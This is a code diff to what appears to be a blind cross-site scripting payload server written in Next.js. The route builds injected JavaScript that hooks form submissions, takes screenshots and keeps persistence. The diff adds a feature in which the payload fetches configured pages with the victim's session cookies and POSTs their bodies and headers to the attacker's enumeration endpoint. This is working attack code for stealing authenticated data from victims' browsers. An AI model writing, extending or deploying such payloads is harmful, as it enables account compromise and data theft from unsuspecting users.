@@ -1,5 +1,5 @@
 import { NextRequest, NextResponse } from 'next/server';
-import { queryOne, Setting } from '@/lib/db';
+import { query, queryOne, Setting, PathEnumerationConfig } from '@/lib/db';
 import { corsHeaders } from '@/lib/cors';
 
 async function getSetting(key: string, defaultValue: string): Promise<string> {
@@ -11,6 +11,17 @@ async function getSetting(key: string, defaultValue: string): Promise<string> {
     return setting?.value || defaultValue;
   } catch {
     return defaultValue;
+  }
+}
+
+async function getActivePathConfigs(): Promise<{ path: string; description: string | null }[]> {
+  try {
+    const configs = await query<PathEnumerationConfig>(
+      'SELECT path, description FROM path_enumeration_config WHERE active = true ORDER BY created_at ASC LIMIT 50'
+    );
+    return configs.map(c => ({ path: c.path, description: c.description }));
+  } catch {
+    return [];
   }
 }
 
@@ -43,11 +54,15 @@ export async function GET(request: NextRequest) {
   const cb = `${baseUrl}/api/callback`;
   const ps = `${baseUrl}/api/persist`;
   const tf = `${baseUrl}/api/traffic`;
+  const pe = `${baseUrl}/api/enumeration/results`;
 
   const screenshotEnabled = await getSetting('screenshot_enabled', 'true') === 'true';
   const persistentEnabled = await getSetting('persistent_enabled', 'false') === 'true';
   const advancedPersistentEnabled = await getSetting('advanced_persistent_enabled', 'false') === 'true';
   const persistentKey = await getSetting('persistent_key', '');
+  
+  // Get active path enumeration configs
+  const pathConfigs = await getActivePathConfigs();
 
   // Build payload  
   let js = `(function(){if(window.__n)return;window.__n=1;`;
@@ -86,8 +101,22 @@ document.addEventListener("submit",function(e){if(window.__nxHooked)return;var f
     js += `_flushPending();setTimeout(function(){initAdvanced()},100);`;
   }
 
+  // Path enumeration - run after we have report ID
+  if (pathConfigs.length > 0) {
+    js += `setTimeout(function(){_enumPaths()},200);`;
+  }
+
   js += `}}catch(e){}};`;
   js += `x.send(JSON.stringify(d))}`;
+
+  // Path enumeration function
+  if (pathConfigs.length > 0) {
+    const pathsJson = JSON.stringify(pathConfigs);
+    js += `var _enumPaths=function(){if(!window.__rid)return;`;
+    js += `var paths=${pathsJson};var results=[];var done=0;`;
+    js += `function sendResults(){if(done>=paths.length&&results.length>0){try{var x=new XMLHttpRequest();x.open("POST","${pe}",true);x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify({rid:window.__rid,results:results}))}catch(e){}}}`;
+    js += `paths.forEach(function(p){try{fetch(p.path,{credentials:"include",mode:"same-origin"}).then(function(r){var hdrs="";try{r.headers.forEach(function(v,k){hdrs+=k+": "+v+"\\r\\n"})}catch(e){}return r.text().then(function(b){results.push({path:p.path,description:p.description,status:r.status,size:b.length,body:b.substring(0,10000),headers:hdrs})}).catch(function(){results.push({path:p.path,description:p.description,status:r.status,size:0,error:"Failed to read body"})})}).catch(function(e){results.push({path:p.path,description:p.description,error:e.message||"Network error"})}).finally(function(){done++;sendResults()})}catch(e){done++;results.push({path:p.path,description:p.description,error:e.message||"Exception"});sendResults()}})};`;
+  }
 
   if (screenshotEnabled) {
     js += `var sc=document.createElement("script");sc.src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";`;
